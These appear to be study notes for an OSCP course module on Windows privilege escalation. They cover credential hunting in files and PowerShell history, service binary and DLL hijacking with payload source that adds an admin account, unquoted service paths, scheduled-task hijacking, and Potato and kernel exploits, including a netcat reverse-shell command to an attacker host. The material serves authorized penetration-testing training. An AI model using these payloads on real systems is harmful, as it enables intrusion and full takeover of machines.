# Windows Privilege Escalation

- Module: PEN-200 / Module 17 — Windows Privilege Escalation (OSCP)
- URL: https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276
- Code/command blocks: 34

> Terminal output is omitted; only commands & scripts are captured. Lab narrative uses host `CLIENTWK220`, users `dave`(low-priv)→`steve`→`daveadmin`/`backupadmin`(admin) — kept literal since the chain refers back to them.
> Placeholders: `{{TARGET_IP}}` the box, `{{LHOST}}` your Kali web-server IP (`iwr`/file staging), `{{USERNAME}}`/`{{PASSWORD}}` creds you've obtained.

> **⚡ Quick jump:** [17.1.2 Situational awareness](#1712-situational-awareness) · [17.1.4 PowerShell history/transcripts](#1714-information-goldmine-powershell) · [17.1.5 winPEAS](#1715-automated-enumeration) · [17.2.1 Service binary hijack](#1721-service-binary-hijacking) · [17.2.2 DLL hijack](#1722-dll-hijacking) · [17.2.3 Unquoted service paths](#1723-unquoted-service-paths) · [17.3.1 Scheduled tasks](#1731-scheduled-tasks) · [17.3.2 Kernel exploits & SeImpersonate/Potato](#1732-using-exploits)

---

# 17.1 — Enumerating Windows

## 17.1.1 Understanding Windows privileges and access control mechanisms

> Four concepts underpin Windows access control: **SID**, **access token**, **Mandatory Integrity Control (MIC)**, **UAC**. Theory only — no commands, but the vocabulary is used throughout the rest of the module.

- **SID** (`S-R-X-Y`) uniquely identifies a principal (user/group); Windows checks SIDs, not usernames. RID ≥1000 = regular account (RID 1001 = 2nd local user created); RID <1000 = well-known (`S-1-5-18`=Local System, `S-1-5-domain-500`=Administrator).
- **Access token** — issued at logon; carries the user's SID, group SIDs, and privileges. A **primary token** is copied onto processes/threads the user starts; an **impersonation token** lets a thread act under a *different* security context (e.g. a named-pipe server impersonating a connecting client — key to the Potato exploits in [17.3.2](#1732-using-exploits)).
- **MIC / integrity levels** (System > High > Medium > Low > Untrusted) — a lower-integrity process cannot modify a higher-integrity object even with adequate permission bits. Check with `whoami /groups` (level) or `icacls` (file's level).
- **UAC** — an admin gets *two* tokens at logon: a filtered standard-user token (default) and the full admin token (only active after a consent prompt elevates to High integrity). Being in `Administrators` ≠ running at High integrity.

## 17.1.2 Situational awareness

> Always establish this baseline first: user/host, group memberships, other users/groups, OS/version/arch, network config, installed apps, running processes. Skipping this is the #1 mistake — most privesc paths are found here, not via exploits.

Identity and group membership:

```cmd
whoami
```

```powershell
whoami /groups                   # current user's SIDs/groups (RDP users, helpdesk, etc.)
Get-LocalUser                    # all local accounts — flag anything with "admin" in the name
Get-LocalGroup                   # non-standard groups (custom descriptions are gold)
Get-LocalGroupMember adminteam   # who's actually in a group of interest
Get-LocalGroupMember Administrators
net user {{USERNAME}}            # legacy equivalent — one user's group memberships
```

> Built-in groups worth knowing: **Backup Operators** (backup/restore *any* file, bypassing ACLs), **Remote Desktop Users** (RDP), **Remote Management Users** (WinRM).

OS/version/arch, network, installed apps, running processes:

```powershell
systeminfo                       # OS name/version/build, architecture
ipconfig /all                    # interfaces, DNS, gateway — static vs DHCP
route print                      # routing table — extra networks = pivot candidates
netstat -ano                     # listening/established connections + owning PID
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname   # 32-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname               # 64-bit apps
Get-Process                      # running processes — cross-ref against netstat PIDs
```

> `Get-CimInstance`/`Get-Service` require an **interactive logon (RDP)** for non-admin users — a bind shell or WinRM session gets "permission denied" querying services.

## 17.1.3 Hidden in plain view

> Users leave secrets in plaintext files — meeting notes, app configs, password-manager databases. Target directories informed by what [17.1.2](#1712-situational-awareness) found installed (e.g. XAMPP, KeePass).

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                        # password DBs
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue               # app configs
Get-ChildItem -Path C:\Users\{{USERNAME}}\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue   # user docs
cat C:\xampp\passwords.txt                # or `type` — cat/type are both aliases for Get-Content
```

> A password found for one user/service should always be tried against **every other account** — password reuse is extremely common (as in the lab: `steve`'s note leaks a password that also unlocks `my.ini`, which in turn reveals `backupadmin`'s Windows password).

Once you land as a new user, re-check their groups, then use it to pivot:

```powershell
net user {{USERNAME}}                     # e.g. is the newly-found account RDP/WinRM-capable?
runas /user:{{USERNAME}} cmd              # needs a GUI (RDP) — password prompt doesn't work over a bind shell/WinRM
```

> If the target user isn't in Remote Desktop/Management Users: use **Runas** (GUI only), or if they have *Log on as a batch job*, schedule a task as them, or if they have an **active session**, use Sysinternals **PsExec**.

## 17.1.4 Information goldmine: PowerShell

> `Clear-History` only clears PowerShell's own `Get-History` — it does **not** touch the `PSReadLine` history file, a very common admin misconception. Always check PSReadLine, and check for PowerShell Transcription/Script Block Logging (defensive controls that also leak plaintext to us).

```powershell
Get-History                                        # PowerShell's own history (often empty/cleared)
(Get-PSReadlineOption).HistorySavePath              # -> AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\{{USERNAME}}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> PSReadLine history often shows the *command* (e.g. `Enter-PSSession -Credential $cred`) but not the credential-building lines that produced `$cred` — those get logged separately by **PowerShell Transcription** if enabled. Find and read the transcript file (commonly under `C:\Users\Public\...`) to recover the plaintext `ConvertTo-SecureString` password.

```powershell
type C:\Users\Public\Transcripts\transcript01.txt   # look for ConvertTo-SecureString / New-Object PSCredential
```

Replay recovered credentials to pivot — build the `$cred` object and use PS remoting, or prefer evil-winrm from Kali (a bind-shell WinRM session can misbehave / return no output):

```powershell
$password = ConvertTo-SecureString "{{PASSWORD}}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("{{USERNAME}}", $password)
Enter-PSSession -ComputerName {{TARGET_IP}} -Credential $cred
```

```bash
evil-winrm -i {{TARGET_IP}} -u {{USERNAME}} -p "{{PASSWORD}}"     # escape any ! in the password
```

## 17.1.5 Automated enumeration

> **winPEAS** automates the above but can miss bespoke findings (it missed the meeting-note file and the transcript in the walkthrough) and can misreport (it misidentified Win11 as Win10) — never fully substitute it for manual review. If AV blocks it, try evasion techniques, or alternatives **Seatbelt**/**JAWS**, or go manual.

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

```powershell
iwr -uri http://{{LHOST}}/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe                              # color legend: red=misconfig, green=protection enabled, cyan=active user, blue=disabled user
```

---

# 17.2 — Leveraging Windows Services

> Services run as `LocalSystem` (includes `NT AUTHORITY\SYSTEM` + `BUILTIN\Administrators` in its token), `Network Service`, `Local Service`, or a configured domain/local user. Three abuse angles: replace the binary, hijack a DLL it loads, or exploit an unquoted path — covered in turn.

## 17.2.1 Service binary hijacking

> If a service binary (esp. one installed outside `C:\Windows\System32`, e.g. under `C:\xampp\`) is **writable by a non-admin group**, replace it, then get the service to (re)start.

Enumerate running services and their binary paths, then check permissions:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\mysql\bin\mysqld.exe"     # look for BUILTIN\Users:(F) with no (I) inherited flag = set on purpose
```

Build a malicious replacement (creates a local admin) and cross-compile for the target's architecture:

```c
#include <stdlib.h>

int main ()
{
int i;

i = system ("net user {{USERNAME}} {{PASSWORD}} /add");
i = system ("net localgroup administrators {{USERNAME}} /add");

return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```

Swap the binary (keep the original to restore afterward), then trigger a restart:

```powershell
iwr -uri http://{{LHOST}}/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql                             # likely "Access is denied" for a non-admin — check StartMode instead
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv                               # need SeShutdownPrivilege to reboot
shutdown /r /t 0                           # if StartMode=Auto, service relaunches your binary on boot
```

> Rebooting a production box in a real engagement is disruptive — only do it in coordination with the client.

**PowerUp.ps1** automates discovery (and sometimes exploitation):

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```powershell
iwr -uri http://{{LHOST}}/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile                  # lists writable service binaries + suggested AbuseFunction
Install-ServiceBinary -Name 'mysql'        # AbuseFunction — can fail if the service path has extra arguments; fall back to manual replace
```

## 17.2.2 DLL hijacking

> Default **safe DLL search mode** order: (1) app's own directory, (2) system dir, (3) 16-bit system dir, (4) Windows dir, (5) current dir, (6) `PATH`. If an app tries to load a DLL that's **missing** from its own directory and that directory is writable, drop a malicious DLL there with the exact expected name.

Confirm write access to the app directory, then use **Process Monitor** (needs admin — install/run the target service locally and monitor there if you don't have admin on the real box) filtered on the process name and on `CreateFile` operations containing the DLL name, to find `NAME NOT FOUND` misses feeding the search order:

```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'    # confirm write access
```

Malicious DLL — `DllMain`'s `DLL_PROCESS_ATTACH` case fires when the DLL is loaded:

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
switch ( ul_reason_for_call )
{
case DLL_PROCESS_ATTACH: // A process is loading the DLL.
int i;
i = system ("net user {{USERNAME}} {{PASSWORD}} /add");
i = system ("net localgroup administrators {{USERNAME}} /add");
break;
case DLL_THREAD_ATTACH: // A process is creating a new thread.
break;
case DLL_THREAD_DETACH: // A thread exits normally.
break;
case DLL_PROCESS_DETACH: // A process unloads the DLL.
break;
}
return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

```powershell
iwr -uri http://{{LHOST}}/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

> The DLL runs with the privileges of *whoever starts the app* — if that's you, nothing gained. This works when you wait for a higher-privileged user to launch the vulnerable app themselves.

## 17.2.3 Unquoted service paths

> If a service binary path has spaces and isn't quoted, `CreateProcess` tries each space-delimited prefix as a candidate `.exe`, walking left to right. Requires: write access to one of those intermediate directories (rare for `C:\` or `C:\Program Files\`, more likely a subfolder like `C:\Program Files\Enterprise Apps\`), and the service must be (re)startable.

Find candidates — services with spaces in an unquoted path outside `C:\Windows\`:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Confirm you can control the service and check permissions on each candidate prefix directory:

```powershell
Start-Service GammaService
Stop-Service GammaService
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"     # look for BUILTIN\Users:(W)
```

Drop your payload as the guessed filename in the writable prefix directory, then (re)start the service:

```powershell
iwr -uri http://{{LHOST}}/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService                    # may error (bad args to your binary) but the payload still runs once
```

PowerUp automates this too:

```powershell
iwr http://{{LHOST}}/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"   # default: creates user john/Password123!
Restart-Service GammaService
```

---

# 17.3 — Abusing Other Windows Components

## 17.3.1 Scheduled tasks

> Same idea as service binary hijacking, applied to Task Scheduler actions. Three questions per task: **who** does it run as, **when/whether** it'll trigger again, **what** it executes. A task that already fired and won't recur is dead; note it for the report but move on.

```powershell
schtasks /query /fo LIST /v          # look at Author, TaskName, Task To Run, Run As User, Next Run Time
```

If the target executable sits somewhere you have Full Access (e.g. inside your own home dir tree, even if the task runs as another user):

```powershell
icacls C:\Users\{{USERNAME}}\Pictures\BackendCacheCleanup.exe
```

```powershell
iwr -Uri http://{{LHOST}}/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

## 17.3.2 Using exploits

> Three exploit families for privesc: **application vulnerabilities** (in installed software running privileged), **kernel exploits** (powerful but crash-prone — verify patch level first, and test on a clone before using in a real engagement), and **privilege abuse** (e.g. `SeImpersonatePrivilege` via named-pipe "Potato" tooling).

Check patch level before trusting any kernel CVE against the box:

```powershell
whoami /priv
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

Run a matched, source-available kernel exploit (verify the CVE against the missing KB from the hotfix list above):

```powershell
.\CVE-2023-29360.exe                 # -> spawns nt authority\system
```

> **`SeImpersonatePrivilege`** — commonly held by service accounts (IIS app pools, LocalService/NetworkService) even for a low-priv-looking foothold. A named-pipe server holding this privilege can capture and impersonate a higher-privileged client that connects to the pipe — the basis of the **Potato** exploit family (RottenPotato, SweetPotato, JuicyPotato, GodPotato, SigmaPotato).

```powershell
whoami /priv                          # confirm SeImpersonatePrivilege: Enabled
```

**Which Potato for which Windows build** — the variant matters because Microsoft killed the older
DCOM/NTLM-reflection trick in Win10 1809 / Server 2019 (build 17763). Check the build first
(`systeminfo` / SMB banner):

| Variant | Works on | Coercion / catch |
|---|---|---|
| RottenPotato / JuicyPotato | ≤ Server 2016 / Win10 1803 | DCOM CLSID — **dead on 2019+ (17763)** |
| **PrintSpoofer** | 2016 / 2019 / Win10 1809+ | Print Spooler pipe — needs **Spooler** running |
| RoguePotato | 2019 | DCOM — needs a **:135 redirector** (more setup) |
| **GodPotato** | 2012 → 2022 (broad) | RPC/DCOM, .NET — newest, most reliable **default** |
| SigmaPotato / SweetPotato | broad (GodPotato forks) | all-in-one, in-memory `.NET` runners |

> **Rule of thumb:** modern box (2019/2022) → **GodPotato** (or PrintSpoofer if Spooler's up).
> Legacy box (≤2016) → JuicyPotato. Don't waste time on JuicyPotato against 17763+ — it just fails.

```bash
# GodPotato — pick the .exe matching the target's .NET (NET4 is the safe default)
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
# SigmaPotato (all-in-one fork)
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```

```powershell
# usage differs slightly per tool — all give a SYSTEM shell/command:
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe {{LHOST}} {{LPORT}} -e cmd.exe"
.\PrintSpoofer64.exe -i -c powershell            # -i interactive, or -c to run a command
```

```powershell
iwr -uri http://{{LHOST}}/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user {{USERNAME}} {{PASSWORD}} /add"
.\SigmaPotato "net localgroup Administrators {{USERNAME}} /add"
```

---

# 17.4 — Wrapping up

> Covered: manual + automated situational awareness (users/groups/network/apps/processes); mining sensitive plaintext (dotfiles/configs, PowerShell PSReadLine history + Transcription logs); three service-abuse vectors (binary hijack, DLL hijack, unquoted path); scheduled-task binary hijack; and exploit-based privesc (kernel CVEs, `SeImpersonatePrivilege`/Potato). Not exhaustive — e.g. privileged file writes aren't covered — but these are the most common real-world vectors. When nothing here lands, move laterally to other systems/services rather than forcing it.
